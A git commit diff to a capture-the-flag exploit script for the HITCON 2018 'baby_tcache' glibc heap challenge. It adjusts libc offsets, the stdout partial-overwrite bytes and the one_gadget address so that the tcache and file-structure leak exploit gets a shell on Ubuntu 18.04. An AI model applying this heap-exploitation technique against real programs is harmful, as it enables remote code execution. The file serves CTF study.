80d5d2486169d79ae6d3097dc06353bfe6b82680
leo <hireedleo@gmail.com>
2021-01-25 04:49:53 -0800

    success pwned under ubuntu18.04

--- pwn/ctf_wiki/glibc_heap/tcache/HITCON2018-baby_tcache/poc_baby_tcache.py
+++ pwn/ctf_wiki/glibc_heap/tcache/HITCON2018-baby_tcache/poc_baby_tcache.py
@@ -13,11 +13,12 @@ g_libcname =  "/glibc/2.27/64/lib/libc-2.27.so" if LOCAL else "./libc-2.27.so" #
 g_ld = "/glibc/2.27/64/lib/ld-2.27.so" #"/glibc/2.27/debug/x64/lib/ld-2.27.so"
 
 if (LOCAL):
-	g_io = process([g_ld, g_fname], env={"LD_PRELOAD" : g_libcname})
+	g_io = process(g_fname)
+	g_libc = g_elf.libc
 else:
 	g_io = remote()
+	g_libc = ELF(g_libcname)
 
-g_libc = ELF(g_libcname)
 
 def getpid():
 	if (DEBUG & LOCAL):
@@ -57,16 +58,16 @@ def pwn():
 	new(0x4f7, "aaa\n") # idx=0, chk_0
 	delete(0) # idx=0, chk_0, write unsortedbin(av) into chk_1's fd and bk.
 	#getpid()
-	new(0x5f7, b'a'*0x4f0 + p64(0x500) + p64(0x101) + b"\x60\x07\xbd") # idx=0, partial write fd, make it points to _IO_2_1_stdout_
+	new(0x5f7, b'a'*0x4f0 + p64(0x500) + p64(0x101) + b"\x60\xe7") # idx=0, partial write fd, make it points to _IO_2_1_stdout_
 
 	new(0xf0, 'a') # idx=1
 	new(0xf0, p64(0xfbad1800) + p64(0)*3 + b'\x00') # idx=2
 	# now receive leaked data
 	data = g_io.recvline()[8:16]
-	libc_base = u64(data) - 0x3b18b0
+	libc_base = u64(data) - 0x3ed8b0 
 	g_libc.address = libc_base
 	addr_free_hook = g_libc.symbols["__free_hook"]
-	one_gadget = g_libc.address + 0xdeec2
+	one_gadget = g_libc.address + 0x10a41c
 	log.success("libc@%#x\nfree_hook@%#x\none_gadget@%#x", libc_base, addr_free_hook, one_gadget)
 	
 	getpid()
@@ -82,7 +83,7 @@ def pwn():
 
 	new(0xf0, "a\n") # idx=1
 	#new(0xf0, p64(one_gadget)) # idx=3
-	new(0xf0, p64(one_gadget) + p64(g_libc.symbols["__realloc"] + 2)) # idx=3
+	new(0xf0, p64(one_gadget) + p64(g_libc.symbols["realloc"] + 2)) # idx=3
 
 	# delete(1) # trigger one_gadget
 	opt(1)	
